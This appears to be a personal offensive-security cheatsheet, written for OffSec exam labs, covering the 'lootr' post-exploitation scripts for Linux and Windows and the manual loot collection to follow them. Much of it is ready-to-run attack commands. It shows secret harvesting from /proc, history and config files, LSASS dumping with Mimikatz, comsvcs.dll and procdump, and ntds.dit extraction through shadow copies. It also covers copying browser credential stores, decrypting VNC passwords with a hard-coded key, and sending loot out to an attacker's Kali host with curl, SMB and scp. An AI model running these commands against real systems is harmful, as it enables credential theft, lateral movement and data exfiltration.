---
tags:
  - phase/postexploitation
  - topic/linux
  - topic/windows
  - tool/lootr
  - type/cheatsheet
---
# lootr — Linux + Windows Loot Collection Cheatsheet

> [!note] engagement Relevance
> Use **lootr.sh** on Linux footholds and **lootr.ps1** on Windows footholds to collect flags, credentials, privesc leads, and pivot data fast. This is **post-exploitation enumeration only**, which fits your OffSec workflow and should be run early after stable shell access.

---

## Usage

### Linux — `lootr.sh`

```bash
# Full run — use after stabilizing shell so you collect flags, creds, and privesc data early
./lootr.sh

# Custom output dir — useful when /tmp or cwd is a better write location on target
./lootr.sh --outdir /tmp/loot

# Quick mode — skip the slower process/service phase when time matters
./lootr.sh --quick

# Single phase — use when you only need one answer fast
./lootr.sh --phase proof
./lootr.sh --phase system
./lootr.sh --phase creds
./lootr.sh --phase network
./lootr.sh --phase files
./lootr.sh --phase procs

# Kali IP for reverse shell snippets in attack_commands.txt
# Auto-detected from $SSH_CLIENT (set by sshd) — only needed if delivered via reverse shell
./lootr.sh --kali-ip 10.10.14.5

# Disable ANSI colors (also: export NO_COLOR=1)
./lootr.sh --no-color
```

### Windows — `lootr.ps1`

```powershell
# Full run — best after you have a stable PowerShell session and writable disk location
.\lootr.ps1

# Custom output dir — useful when writing under current directory is messy or restricted
.\lootr.ps1 -OutDir C:\Windows\Temp\loot

# Quick mode — skips slower file/privesc enumeration when you need creds and flags first
.\lootr.ps1 -Quick

# Single phase — use to answer one question quickly instead of running everything
.\lootr.ps1 -Phase proof
.\lootr.ps1 -Phase system
.\lootr.ps1 -Phase creds
.\lootr.ps1 -Phase network
.\lootr.ps1 -Phase files

# Kali IP for LHOST in msfvenom commands in attack_commands.txt
# Auto-detected from active RDP/WinRM/SSH session — only needed if delivered via bind shell
.\lootr.ps1 -KaliIp 10.10.14.5

# Disable ANSI colors
.\lootr.ps1 -NoColor
```

> [!tip] Transfer + Execution
> On Windows, this is most useful in a **PowerShell** context after you already have code execution. On Linux, run it after upgrading to a stable shell. Keep **Penelope** ready for your shell handling and stay inside **tmux**.

## Quick Decision Tree

```
Stable shell obtained?
│
├── Linux target
│   ├── Need everything now → ./lootr.sh
│   ├── Need speed first → ./lootr.sh --quick
│   └── Need one answer only → ./lootr.sh --phase <proof|system|creds|network|files|procs>
│
└── Windows target
    ├── Need everything now → .\lootr.ps1
    ├── Need creds/flags first → .\lootr.ps1 -Quick
    └── Need one answer only → .\lootr.ps1 -Phase <proof|system|creds|network|files>
```

## Output Layout

### Linux

```bash
loot/<hostname>/
├── summary.txt          # ★ Findings overview
├── next_steps.txt       # ★ START HERE — evidence-backed exploit commands
├── attack_commands.txt  # Legacy alias with the same commands
├── progress.log
├── proof/
├── system/
├── creds/
├── network/
└── files/
```

### Windows

```powershell
loot\<hostname>\
├── summary.txt          # ★ Findings overview
├── next_steps.txt       # ★ START HERE — evidence-backed exploit commands
├── attack_commands.txt  # Legacy alias with the same commands
├── progress.log
├── proof\
├── system\
├── creds\
├── network\
└── files\
```

## Phase Map

| Phase | Linux `lootr.sh` | Windows `lootr.ps1` | Why it matters |
|------|------|------|------|
| `proof` | Yes | Yes | Grab `local.txt` / `proof.txt` immediately and preserve path context |
| `system` | Yes | Yes | Build user, host, privilege, software, and task/service context |
| `creds` | Yes | Yes | Hunt reusable secrets, keys, histories, and privilege indicators |
| `network` | Yes | Yes | Identify internal listeners, routes, DNS, shares, and pivot opportunities |
| `files` | Yes | Yes | Surface privesc vectors, writable paths, backups, scripts, and interesting files |
| `procs` | Yes | No | Linux-only deeper process/service pass for manual follow-up |

## What Each Phase Produces

The scripts handle all collection logic. This section tells you **what to look for in the output**, not what the scripts do internally.

### Linux — `lootr.sh`

| Phase | Key output files | What you're looking for |
|-------|-----------------|------------------------|
| `proof` | `proof/local.txt`, `proof/proof.txt` | Flags — `cat`, screenshot, note path |
| `system` | `system/sudo_rights.txt`, `system/whoami.txt`, `system/id.txt` | sudo rights, group memberships, privilege context |
| `creds` | `creds/shadow_hashes.txt`, `creds/key_*`, `creds/config_files_with_creds.txt`, `creds/kerberos.txt` | Hashes to crack, SSH keys to reuse, cleartext creds, ticket material |
| `network` | `network/internal_listeners.txt`, `network/reachable_subnets.txt`, `network/hosts.txt` | 127.x services to tunnel, new subnets/hosts to target |
| `files` | `files/suid_binaries.txt`, `files/capabilities.txt`, `files/cron_jobs.txt`, `files/recently_modified.txt` | GTFOBins candidates, cap_setuid, writable cron scripts, fresh changes |
| `procs` | `procs/root_processes.txt`, `procs/services.txt` | Root-owned services to abuse, pspy candidates |

> For exploitation steps on SUID, capabilities, cron, and other Linux privesc vectors → [[Linux_PrivEsc]]

### Windows — `lootr.ps1`

| Phase | Key output files | What you're looking for |
|-------|-----------------|------------------------|
| `proof` | `proof\local.txt`, `proof\proof.txt` | Flags — `type`, screenshot, note path |
| `system` | `system\systeminfo.txt`, `system\whoami.txt`, `system\admins.txt` | Patch level, admin group membership, installed software |
| `creds` | `creds\privileges.txt`, `creds\cmdkey.txt`, `creds\autologon.txt`, `creds\wifi_passwords.txt`, `creds\putty_sessions.txt` | SeImpersonate → potato, stored creds → runas, cleartext passwords |
| `network` | `network\internal_listeners.txt`, `network\shares.txt`, `network\mapped_drives.txt`, `network\hosts.txt` | 127.0.0.1 services to tunnel, SMB shares to loot, lateral targets |
| `files` | `files\always_install_elevated.txt`, `files\unquoted_service_paths.txt`, `files\writable_service_binaries.txt`, `files\writable_path_dirs.txt`, `files\dll_hijack_candidates.txt` | Direct privesc vectors — each maps to a known technique |

> For exploitation steps on AlwaysInstallElevated, service abuse, potato attacks, and other Windows privesc vectors → [[Windows_PrivEsc]]

## Review Order After Execution

### Linux review order

```bash
HOST=$(hostname)

# 1. ★ START HERE — pre-built exploit commands for every finding
cat loot/$HOST/next_steps.txt

# 2. Full findings summary
cat loot/$HOST/summary.txt

# 3. Flag confirmation and proof preservation
ls loot/$HOST/proof/

# 4. Crack / reuse / pivot material
cat loot/$HOST/creds/shadow_hashes.txt
ls loot/$HOST/creds/key_*
cat loot/$HOST/creds/config_files_with_creds.txt
cat loot/$HOST/creds/kerberos.txt

# 5. Direct privesc leads
cat loot/$HOST/system/sudo_rights.txt
cat loot/$HOST/files/capabilities.txt
cat loot/$HOST/files/suid_binaries.txt
cat loot/$HOST/files/cron_jobs.txt
cat loot/$HOST/files/recently_modified.txt

# 6. Pivot clues
cat loot/$HOST/network/internal_listeners.txt
cat loot/$HOST/network/reachable_subnets.txt
cat loot/$HOST/network/hosts.txt
```

### Windows review order

```powershell
$HOSTNAME = $env:COMPUTERNAME
$ROOT = ".\loot\$HOSTNAME"

# 1. ★ START HERE — pre-built exploit commands for every finding
Get-Content "$ROOT\next_steps.txt"

# 2. Full findings summary
Get-Content "$ROOT\summary.txt"

# 3. Flag confirmation
Get-ChildItem "$ROOT\proof"

# 4. Direct privesc checks
Get-Content "$ROOT\files\always_install_elevated.txt"
Get-Content "$ROOT\files\unquoted_service_paths.txt"
Get-Content "$ROOT\files\writable_service_binaries.txt"
Get-Content "$ROOT\files\writable_path_dirs.txt"
Get-Content "$ROOT\files\dll_hijack_candidates.txt"

# 5. Dangerous privileges and reusable creds
Get-Content "$ROOT\creds\privileges.txt"
Get-Content "$ROOT\creds\cmdkey.txt"
Get-Content "$ROOT\creds\autologon.txt"
Get-Content "$ROOT\creds\wifi_passwords.txt"
Get-Content "$ROOT\creds\putty_sessions.txt"

# 6. Pivot and lateral clues
Get-Content "$ROOT\network\internal_listeners.txt"
Get-Content "$ROOT\network\shares.txt"
Get-Content "$ROOT\network\mapped_drives.txt"
Get-Content "$ROOT\network\hosts.txt"
```

## Post-Collection Action Loop

> [!important] Do Not Let Findings Sit
> Every lootr finding maps to an immediate next action. If you finish reviewing and haven't acted on anything yet, you wasted the collection.

> [!tip] next_steps.txt generates all of the below automatically
> Every finding lootr surfaces also writes a ready-to-run command into `next_steps.txt`. `attack_commands.txt` remains as a legacy alias.

| Finding | Immediate action |
|---------|-----------------|
| Flags found | `cat`/`type`, screenshot with `whoami` and path, note in report — **do this first** |
| Shadow hashes | `next_steps.txt` has `unshadow` + `crackr.sh` pipeline |
| SSH keys | `next_steps.txt` has `ssh -i key USER@HOST` per user per key |
| Stored creds (cmdkey, autologon, wifi, cleartext) | Test reuse now — feed to `sprayr.sh` if AD context |
| Kerberos tickets | Import and test with `impacket` tools now |
| SeImpersonatePrivilege | `next_steps.txt` has Potato command for detected OS version |
| SeBackupPrivilege / SeDebugPrivilege | `next_steps.txt` has `reg save` / `procdump` command |
| AlwaysInstallElevated | `next_steps.txt` has `msfvenom` MSI + `msiexec` only when both HKLM and HKCU are enabled |
| Unquoted service paths / writable service binaries | `next_steps.txt` has payload placement + restart command |
| Writable scheduled task binaries | `next_steps.txt` has payload placement only when a high-privilege task binary is writable |
| SUID / capabilities hits | `next_steps.txt` has GTFOBins one-liner per binary |
| Writable cron jobs | `next_steps.txt` has injection template |
| sudo rights | `next_steps.txt` has GTFOBins command per allowed binary |
| Internal listeners on 127.x | `next_steps.txt` has `pivotr.sh` command per port |
| New subnets / hosts discovered | Add to target list, scan with `recon.sh` now |
| SMB shares / mapped drives | Enumerate for creds and data now |

## When To Use Which Mode

| Situation | Linux | Windows |
|------|------|------|
| Just landed shell and need fast wins | `./lootr.sh --quick` | `.\lootr.ps1 -Quick` |
| Need flags immediately | `--phase proof` | `-Phase proof` |
| Need reusable creds for spray / lateral movement | `--phase creds` | `-Phase creds` |
| Need pivot data | `--phase network` | `-Phase network` |
| Need privesc vectors | `--phase files` and maybe `--phase procs` | `-Phase files` |
| Want full host picture for note-taking | full run | full run |

## Common Operator Patterns

### Linux exfil

`KALI_IP` in the exfil commands below is auto-detected from `$SSH_CLIENT` (the IP your SSH session came from). If lootr.sh was delivered via reverse shell instead, pass `--kali-ip` explicitly.

```bash
# Compress loot before transfer so you preserve structure and reduce copy pain
HOST=$(hostname)
tar czf /tmp/${HOST}_loot.tgz loot/$HOST

# HTTP pull from Kali if you can serve or fetch cleanly
curl http://<auto-kali-ip>:PORT/${HOST}_loot.tgz -o ${HOST}_loot.tgz

# SMB copy if your share is already up
cp -r loot/$HOST //<auto-kali-ip>/share/

# SCP if SSH works and creds are stable
scp -r loot/$HOST kali@<auto-kali-ip>:~/loot_${HOST}/
```

### Windows staging

`LHOST` in all msfvenom commands in `attack_commands.txt` is auto-detected from the active RDP/WinRM/SSH connection. Pass `-KaliIp` if delivered via bind shell.

```powershell
# Example transfer from Kali-served HTTP to target, then execute from temp
cd C:\Windows\Temp
iwr -Uri http://<kali-ip>/lootr.ps1 -OutFile lootr.ps1
powershell -ep bypass -File .\lootr.ps1 -OutDir C:\Windows\Temp\loot -KaliIp <kali-ip>
```

## Gotchas / OffSec Notes

> [!warning] Execution Context
> These scripts are **post-exploitation collection tools**, not initial enumeration tools. Run them after you already have access. Do not confuse them with your recon scripts.

> [!warning] Quick Mode Differences
> On Linux, `--quick` skips the slower **process/service** phase. On Windows, `-Quick` skips the slower **files/privesc** phase. That means a Windows quick run can miss **AlwaysInstallElevated**, **unquoted service paths**, and **DLL hijack** clues.

> [!warning] Loot Sensitivity
> The output may contain flags, hashes, private keys, Wi-Fi passwords, registry-derived creds, and ticket material. Treat the loot directory like evidence and keep host folders separated.

> [!important] High-ROI Checks
> Start with `next_steps.txt` — it synthesizes every finding into ready-to-run commands. Then:
> Linux: `summary.txt`, `shadow_hashes.txt`, SSH keys, `sudo_rights.txt`, `capabilities.txt`, `internal_listeners.txt`.
> Windows: `summary.txt`, `always_install_elevated.txt`, `privileges.txt`, `autologon.txt`, `cmdkey.txt`, `wifi_passwords.txt`, `unquoted_service_paths.txt`.

---

## What lootr Won't Find — Manual Loot Collection

> [!important] lootr.sh / lootr.ps1 collect the common high-value items. These are the gaps — things that require context, judgment, or access to specific locations the script doesn't check.

---

### Linux — Manual Checks After lootr.sh

**Processes and memory:**
```bash
# Credentials in running process environment variables
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|pwd|key|token|secret|api'

# Process command-line args (may show -p password or --token= flags)
ps aux | grep -iE 'pass|user|token|secret|credential'
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -iE 'pass|user|token'

# Check if a service is running as a privileged user with interesting args
ps -ef | grep -v '\[' | awk '{print $1,$8,$9,$10,$11}' | sort -u
```

**Non-standard file locations:**
```bash
# Find recently modified files (in last 7 days)
find / -newer /etc/passwd -type f 2>/dev/null | grep -v proc | grep -v sys | head -30

# Find files with "password" in the name
find / -iname "*password*" -o -iname "*passwd*" -o -iname "*secret*" -o -iname "*cred*" \
  2>/dev/null | grep -v proc | grep -v sys

# Non-standard config locations
find /opt /srv /data /backup /home /var/backups -type f 2>/dev/null | \
  xargs grep -liE 'password|passwd|secret' 2>/dev/null | head -10

# Database config files
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | grep -v proc
# If you find a .db file: sqlite3 database.db .tables && sqlite3 database.db "SELECT * FROM users;"

# SSH config with key path hints
cat ~/.ssh/config 2>/dev/null
cat /etc/ssh/ssh_config | grep IdentityFile
```

**Mail and user files:**
```bash
# Check local mail (sometimes contains passwords or internal comms)
cat /var/mail/* 2>/dev/null | head -50
ls /var/spool/mail/ 2>/dev/null
cat /home/*/.forward 2>/dev/null

# .netrc files (contain FTP/HTTP credentials in plaintext)
find /home /root -name ".netrc" -readable 2>/dev/null | xargs cat

# Bash/zsh history of all accessible users
find /home /root -name ".*history" -readable 2>/dev/null | xargs cat
cat /root/.bash_history 2>/dev/null

# sudo command history (sometimes reveals passwords used with sudo)
cat ~/.sudo_as_admin_successful 2>/dev/null
```

**Network — internal services you can't see from Kali:**
```bash
# Full listener list including localhost-only services
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
ss -ulnp 2>/dev/null    # UDP listeners too

# NFS shares (may be mountable without creds)
showmount -e localhost 2>/dev/null

# Check /etc/fstab for auto-mounts (may reveal internal share paths + creds)
cat /etc/fstab | grep -v '^#'

# Internal routing (find networks this host routes to)
ip route show
cat /proc/net/fib_trie | grep "LOCAL\|HOST" | awk '{print $2}' | sort -u
```

---

### Windows — Manual Checks After lootr.ps1

**In-memory credentials (requires SYSTEM or SeDebugPrivilege):**
```powershell
# Mimikatz — dump LSASS (run as SYSTEM or admin)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "exit"

# Built-in MiniDump via comsvcs.dll (no 3rd-party binary):
$lsassPid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full

# Or procdump:
tasklist | findstr lsass
procdump.exe -accepteula -ma <lsass_pid> C:\Temp\lsass.dmp

# Parse dump on Kali → pypykatz lsa minidump lsass.dmp

# WDigest — if enabled, plaintext passwords cached in memory
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
# If value = 1 or key missing → WDigest is enabled → Mimikatz sekurlsa::wdigest
```

**Credential storage locations lootr may not reach:**
```powershell
# Windows Vault / Credential Manager (full list)
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
# Includes: saved RDP passwords, network share credentials, web credentials

# IIS application pool passwords
Get-WebConfiguration system.applicationHost/applicationPools/add -recurse | \
  Select-Object name,userName,password | Format-List

# Service account passwords (sometimes stored plaintext in service configs)
sc qc <servicename>
Get-WmiObject Win32_Service | Select-Object Name, StartName, PathName | Format-List

# IIS web.config — sometimes contains DB connection strings with passwords
Get-ChildItem -Path C:\inetpub -Recurse -Filter "web.config" 2>$null | \
  Select-String -Pattern "password|connectionString" 2>$null

# PowerShell SecureString that might be crackable
# If you find: ConvertFrom-SecureString ... in a script
# The encrypted value uses DPAPI — decrypt with the user's context
# [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securestring))
```

**Registry and configuration files:**
```powershell
# Unattend.xml / sysprep.inf — installation files sometimes left with admin passwords
Get-ChildItem -Path C:\ -Recurse -Include unattend.xml,sysprep.inf,sysprep.xml 2>$null | \
  Select-String -Pattern "Password" 2>$null

# Common paths
type C:\Windows\Panther\unattend.xml 2>$null | findstr /i password
type C:\Windows\System32\sysprep\sysprep.inf 2>$null

# TightVNC / RealVNC password (stored in registry, DES-encrypted)
reg query HKCU\Software\TightVNC\Server /v Password 2>$null
reg query HKLM\Software\TightVNC\Server /v Password 2>$null
# Decrypt with: echo -n 'HEX' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt \
#   -K e84ad660c4721ae0 -iv 0000000000000000 -d | cat

# PuTTY saved sessions (may have proxy passwords)
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s 2>$null | findstr /i "hostname\|password"
```

**Browser credentials (offline extraction):**
```powershell
# Chrome: copy the Login Data file and decrypt on Kali
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" C:\Temp\chrome_logins
# Transfer to Kali: python3 chrome_decrypt.py or use pypykatz

# Firefox: copy profile directory
$profile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory | Select-Object -First 1
copy "$($profile.FullName)\logins.json" C:\Temp\ff_logins.json
copy "$($profile.FullName)\key4.db" C:\Temp\ff_key4.db
# Decrypt on Kali: python3 firefox_decrypt.py /path/to/profile/
```

**Active Directory replication data (from DCs):**
```powershell
# If you're on a DC as SYSTEM — dump ntds.dit directly
vssadmin create shadow /for=C: 2>&1 | findstr "shadow copy volume"
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\ntds\ntds.dit C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
# Transfer to Kali → impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Related

- [[OffSec_Exam_Methodology_Complete]]
- [[Reverse_Shells]]
- [[Linux_PrivEsc]]
- [[Windows_PrivEsc]]
- [[pivotr]]
- [[sprayr]]
- [[crackr]]
- [[servr]]
